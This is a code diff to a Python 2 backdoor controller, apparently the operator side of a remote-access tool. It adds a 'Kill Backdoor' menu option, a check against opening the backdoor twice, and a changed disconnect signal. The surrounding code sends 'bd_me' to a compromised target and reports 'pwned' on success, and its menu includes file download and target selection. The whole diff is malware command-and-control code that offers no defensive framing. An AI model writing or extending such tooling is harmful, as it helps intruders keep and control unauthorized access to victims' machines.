@@ -122,6 +122,7 @@ def main():
   3               Download File
   4               Target IP & Port
   5               Backdoor Client
+  6               Kill Backdoor
   q               Quit
   help            Display Options
   dc              Disconnect from Client
@@ -150,13 +151,26 @@ def main():
                 print addr
         elif choice == "5":
             try:
+                if bd_check == 'open':
+                    print "Backdoor already open"
+                    continue
+                bd_check = 'open'
                 conn.send("bd_me")
                 pwned = conn.recv(1024)
                 if pwned == "pwned":
                     print "Backdoor Successful."
-                    time.sleep(2)
             except:
                 print "Didn't work"
+        elif choice == "6":
+            try:
+                bd_check = 'closed'
+                conn.send("kill_bd")
+                bd_kill = conn.recv(1024)
+                if bd_kill == "bd_killed":
+                    print "Backdoor killed."
+                    continue
+            except:
+                print "Uh oh, can't kill backdoor!"
         elif choice == "q":
             conn.send("D1SC0NN3CT")
             print "[+] Disconnecting Target & Exiting.."
@@ -170,7 +184,7 @@ def main():
             print options
         elif choice == "dc":
             print "[+] Disconnect from Target but don't Exit"
-            conn.send("disconnect")
+            conn.send("D1SC0NN3CT2")
             time.sleep(1)
             conn.close()
         else:
